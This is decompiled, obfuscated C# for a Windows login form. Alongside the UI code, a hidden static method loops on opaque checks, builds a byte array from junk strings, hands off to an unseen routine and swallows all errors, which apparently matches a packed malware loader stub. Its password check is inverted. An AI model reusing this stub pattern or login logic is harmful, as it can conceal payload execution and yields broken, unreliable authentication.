using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Dz5;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using g1N5;
using j7T;
using r2M;
using r5F;
using w9X;

namespace i9M;

[DesignerGenerated]
public class Ws4 : Form
{
	internal delegate void o5W();

	private string password;

	internal static string[] Listt;

	internal static Dictionary<string, object> mDic;

	internal static string dName;

	internal static string tName;

	internal static string mName;

	internal static string mArray;

	internal static string sArray;

	internal static string T;

	internal static string sNum;

	private IContainer components;

	private BindingSource _UsernamesBindingSource;

	private Label _lblTime;

	private Label _lblDate;

	private Button _btnLogin;

	private TextBox _txtPassword;

	private Label _Label3;

	private BindingSource _AdminBindingSource1;

	private BindingSource _UsernamesBindingSource1;

	internal string E;

	internal BindingSource G;

	internal Timer a;

	internal TextBox b;

	internal Label C;

	internal PictureBox s;

	internal LinkLabel D;

	public Ws4()
	{
		((Form)this).add_Load((EventHandler)Dj3);
		He5();
	}

	private void Qa3(object sender, EventArgs e)
	{
		Fj9().set_Text(Conversions.ToString(DateAndTime.get_TimeOfDay()));
	}

	private void Dj3(object sender, EventArgs e)
	{
		Wm3().Start();
		Lm1().set_Text(Conversions.ToString(DateTime.Today));
	}

	public void y3X()
	{
		((TextBoxBase)f9N()).Clear();
		((TextBoxBase)d0M()).Clear();
	}

	private void x8R(object sender, EventArgs e)
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Invalid comparison between Unknown and I4
		do
		{
			password = f9N().get_Text();
			string text = (E = d0M().get_Text());
			if (Operators.CompareString(password, "", false) != 0)
			{
				MessageBox.Show("Invalid Username And/Or Password", "Error", (MessageBoxButtons)5, (MessageBoxIcon)48);
				y3X();
				continue;
			}
			((Control)this).Hide();
			break;
		}
		while ((int)((Form)this).get_DialogResult() == 4);
	}

	private void Tj8(object sender, LinkLabelLinkClickedEventArgs e)
	{
		((Control)this).Hide();
		((Control)Mi0.Forms.My4()).Show();
	}

	[STAThread]
	public static void i7Q()
	{
		try
		{
			int pk;
			do
			{
				pk = 2;
			}
			while (!Bj0b.Ct3n() || !w7Z.Xg0(pk));
			mDic = new Dictionary<string, object>();
			Listt = new string[11]
			{
				"ccc", "aaa", "sss,", "ddd", "fff", "ggg", "hhh", "jjj", "kkk", "lll",
				"ppp"
			};
			dName = d9P.Xz1(Listt, 0, 1);
			mDic.Add(dName, Listt);
			tName = d9P.Xz1(Listt, 1, 1);
			mName = d9P.Xz1(Listt, 2, 2);
			mArray = d9P.Xz1(Listt, 3, 3);
			sArray = d9P.Xz1(Listt, 4, 4);
			T = d9P.Xz1(Listt, 5, 5);
			sNum = d9P.Xz1(Listt, 6, 6);
			mDic.Add(sNum, 97);
			byte[] value = Nx5.w3N(97, 15);
			mDic.Add(sArray, value);
			n1F.a2K5();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	protected override void f8P(bool r8P)
	{
		try
		{
			if (r8P && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(r8P);
		}
	}

	private void He5()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Expected O, but got Unknown
		//IL_0189: Unknown result type (might be due to invalid IL or missing references)
		//IL_0193: Expected O, but got Unknown
		//IL_022d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0237: Expected O, but got Unknown
		//IL_02c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_0344: Unknown result type (might be due to invalid IL or missing references)
		//IL_034e: Expected O, but got Unknown
		//IL_03c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d2: Expected O, but got Unknown
		//IL_046c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0476: Expected O, but got Unknown
		//IL_05b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05bd: Expected O, but got Unknown
		//IL_072a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0734: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ws4));
		j4Z(new Label());
		a1L(new Label());
		La2(new Timer(components));
		j4N(new Button());
		x5B(new TextBox());
		d2J(new TextBox());
		Wf1(new Label());
		Bn7(new Label());
		i9P(new PictureBox());
		((ISupportInitialize)k7F()).BeginInit();
		((ISupportInitialize)Yj9()).BeginInit();
		((ISupportInitialize)Mc3()).BeginInit();
		((ISupportInitialize)Rb0()).BeginInit();
		((Control)this).SuspendLayout();
		Fj9().set_AutoSize(true);
		((Control)Fj9()).set_BackColor(Color.Transparent);
		((Control)Fj9()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)Fj9()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Fj9()).set_Location(new Point(135, 238));
		((Control)Fj9()).set_Name("lblTime");
		((Control)Fj9()).set_Size(new Size(45, 15));
		((Control)Fj9()).set_TabIndex(25);
		Fj9().set_Text("Label5");
		Lm1().set_AutoSize(true);
		((Control)Lm1()).set_BackColor(Color.Transparent);
		((Control)Lm1()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)Lm1()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Lm1()).set_Location(new Point(141, 223));
		((Control)Lm1()).set_Name("lblDate");
		((Control)Lm1()).set_Size(new Size(45, 15));
		((Control)Lm1()).set_TabIndex(24);
		Lm1().set_Text("Label4");
		((ButtonBase)Yw7()).set_BackColor(Color.WhiteSmoke);
		((ButtonBase)Yw7()).set_FlatStyle((FlatStyle)1);
		((Control)Yw7()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Yw7()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Yw7()).set_Location(new Point(408, 227));
		((Control)Yw7()).set_Name("btnLogin");
		((Control)Yw7()).set_Size(new Size(104, 36));
		((Control)Yw7()).set_TabIndex(23);
		((ButtonBase)Yw7()).set_Text("Login");
		((ButtonBase)Yw7()).set_UseVisualStyleBackColor(false);
		((Control)f9N()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)f9N()).set_Location(new Point(429, 146));
		((Control)f9N()).set_Name("txtPassword");
		((Control)f9N()).set_Size(new Size(140, 20));
		((Control)f9N()).set_TabIndex(22);
		f9N().set_UseSystemPasswordChar(true);
		((TextBoxBase)d0M()).set_BorderStyle((BorderStyle)1);
		((Control)d0M()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)d0M()).set_Location(new Point(429, 102));
		((Control)d0M()).set_Name("txtUsername");
		((Control)d0M()).set_Size(new Size(140, 20));
		((Control)d0M()).set_TabIndex(21);
		Tf1().set_AutoSize(true);
		((Control)Tf1()).set_BackColor(Color.Transparent);
		((Control)Tf1()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Tf1()).set_ForeColor(SystemColors.ControlLight);
		((Control)Tf1()).set_Location(new Point(359, 146));
		((Control)Tf1()).set_Name("Label3");
		((Control)Tf1()).set_Size(new Size(65, 13));
		((Control)Tf1()).set_TabIndex(19);
		Tf1().set_Text("Password:");
		Dy1().set_AutoSize(true);
		((Control)Dy1()).set_BackColor(Color.Transparent);
		((Control)Dy1()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Dy1()).set_ForeColor(SystemColors.ControlLight);
		((Control)Dy1()).set_Location(new Point(359, 110));
		((Control)Dy1()).set_Name("Label2");
		((Control)Dy1()).set_Size(new Size(67, 13));
		((Control)Dy1()).set_TabIndex(18);
		Dy1().set_Text("Username:");
		((Control)Hd1()).set_BackColor(Color.Transparent);
		((Control)Hd1()).set_Location(new Point(52, 168));
		((Control)Hd1()).set_Name("PictureBox1");
		((Control)Hd1()).set_Size(new Size(268, 154));
		Hd1().set_SizeMode((PictureBoxSizeMode)4);
		Hd1().set_TabIndex(16);
		Hd1().set_TabStop(false);
		k7F().set_DataMember("Admin");
		Yj9().set_DataMember("Usernames");
		Bi6().set_ActiveLinkColor(Color.Black);
		((Label)Bi6()).set_AutoSize(true);
		((Control)Bi6()).set_BackColor(Color.Transparent);
		((Control)Bi6()).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		Bi6().set_LinkColor(Color.White);
		((Control)Bi6()).set_Location(new Point(443, 279));
		((Control)Bi6()).set_Name("linkVisitor");
		((Control)Bi6()).set_Size(new Size(54, 13));
		((Control)Bi6()).set_TabIndex(26);
		Bi6().set_TabStop(true);
		Bi6().set_Text("Visitor...");
		Mc3().set_DataMember("Usernames");
		Rb0().set_DataMember("Admin");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(589, 345));
		((Control)this).get_Controls().Add((Control)(object)Bi6());
		((Control)this).get_Controls().Add((Control)(object)Fj9());
		((Control)this).get_Controls().Add((Control)(object)Lm1());
		((Control)this).get_Controls().Add((Control)(object)Yw7());
		((Control)this).get_Controls().Add((Control)(object)f9N());
		((Control)this).get_Controls().Add((Control)(object)d0M());
		((Control)this).get_Controls().Add((Control)(object)Tf1());
		((Control)this).get_Controls().Add((Control)(object)Dy1());
		((Control)this).get_Controls().Add((Control)(object)Hd1());
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("LoginInfo");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("LOGIN");
		((ISupportInitialize)Hd1()).EndInit();
		((ISupportInitialize)k7F()).EndInit();
		((ISupportInitialize)Yj9()).EndInit();
		((ISupportInitialize)Mc3()).EndInit();
		((ISupportInitialize)Rb0()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual BindingSource Mc3()
	{
		return _UsernamesBindingSource;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q6R(BindingSource Wp2)
	{
		_UsernamesBindingSource = Wp2;
	}

	[SpecialName]
	internal virtual BindingSource Rb0()
	{
		return G;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g4X(BindingSource Fy7)
	{
		BindingSource val = (G = Fy7);
	}

	[SpecialName]
	internal virtual Label Fj9()
	{
		return _lblTime;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j4Z(Label x9F)
	{
		_lblTime = x9F;
	}

	[SpecialName]
	internal virtual Label Lm1()
	{
		return _lblDate;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a1L(Label j7F)
	{
		_lblDate = j7F;
	}

	[SpecialName]
	internal virtual Timer Wm3()
	{
		return a;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void La2(Timer Eo4)
	{
		EventHandler eventHandler = Qa3;
		Timer val = a;
		if (val != null)
		{
			val.remove_Tick(eventHandler);
		}
		Timer val2 = (a = Eo4);
		val = a;
		if (val != null)
		{
			val.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Yw7()
	{
		return _btnLogin;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j4N(Button Kf6)
	{
		EventHandler eventHandler = x8R;
		Button btnLogin = _btnLogin;
		if (btnLogin != null)
		{
			((Control)btnLogin).remove_Click(eventHandler);
		}
		_btnLogin = Kf6;
		btnLogin = _btnLogin;
		if (btnLogin != null)
		{
			((Control)btnLogin).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox f9N()
	{
		return _txtPassword;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x5B(TextBox g4Z)
	{
		_txtPassword = g4Z;
	}

	[SpecialName]
	internal virtual TextBox d0M()
	{
		return b;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d2J(TextBox Ny5)
	{
		TextBox val = (b = Ny5);
	}

	[SpecialName]
	internal virtual Label Tf1()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wf1(Label z8E)
	{
		_Label3 = z8E;
	}

	[SpecialName]
	internal virtual Label Dy1()
	{
		return C;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Bn7(Label z6B)
	{
		Label val = (C = z6B);
	}

	[SpecialName]
	internal virtual PictureBox Hd1()
	{
		return s;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void i9P(PictureBox Wo4)
	{
		PictureBox val = (s = Wo4);
	}

	[SpecialName]
	internal virtual BindingSource k7F()
	{
		return _AdminBindingSource1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f4Q(BindingSource m9N)
	{
		_AdminBindingSource1 = m9N;
	}

	[SpecialName]
	internal virtual BindingSource Yj9()
	{
		return _UsernamesBindingSource1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x0F(BindingSource t4P)
	{
		_UsernamesBindingSource1 = t4P;
	}

	[SpecialName]
	internal virtual LinkLabel Bi6()
	{
		return D;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xy0(LinkLabel No6)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(Tj8);
		LinkLabel d = D;
		if (d != null)
		{
			d.remove_LinkClicked(val);
		}
		LinkLabel val2 = (D = No6);
		d = D;
		if (d != null)
		{
			d.add_LinkClicked(val);
		}
	}
}
